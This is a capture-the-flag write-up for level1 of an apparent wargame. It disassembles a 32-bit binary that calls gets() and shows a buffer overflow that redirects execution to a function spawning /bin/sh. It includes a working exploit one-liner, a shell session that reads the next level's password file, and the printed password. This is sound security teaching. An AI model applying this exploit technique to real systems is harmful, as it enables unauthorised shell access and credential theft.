## level1

This is a very short program that seems to only call `gets`.

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:     mov    ebp,esp
   0x08048483 <+3>:     and    esp,0xfffffff0
   0x08048486 <+6>:     sub    esp,0x50
   0x08048489 <+9>:     lea    eax,[esp+0x10]
   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave  
   0x08048496 <+22>:    ret    
End of assembler dump.
```

The man page of `gets` says the following:

```
BUGS
       Never  use  gets().   Because  it is impossible to tell without knowing the
       data in advance how many characters gets() will read,  and  because  gets()
       will  continue  to  store  characters past the end of the buffer, it is ex‐
       tremely dangerous to use.  It has been used  to  break  computer  security.
       Use fgets() instead.
```

There is another function called `run` that opens a shell with the permissions of the next level.

```
(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```

Decompiled with Ghidra, the full program looks like this:

```c
void run() {
    fwrite("Good... Wait what?\n", 1, 19, stdout);
    system("/bin/sh");
}

int main() {
    char buf[64];
    gets(buf);
}
```

Our goal is to overwrite the return address of `main` so that it jumps to `run` insteads of exiting the program.

The layout of the stack before calling `gets` is:
- return address (4 bytes)
- base pointer (4 bytes)
- unused bytes due to alignment (8 bytes)
- buffer (64 bytes)

With a Python one-liner, we provide 76 garbage values, then the address of `run` in little endian. We call `cat` to keep stdin of `level1`, allowing us to use the shell.

```
level1@RainFall:~$ (python -c 'print("w" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
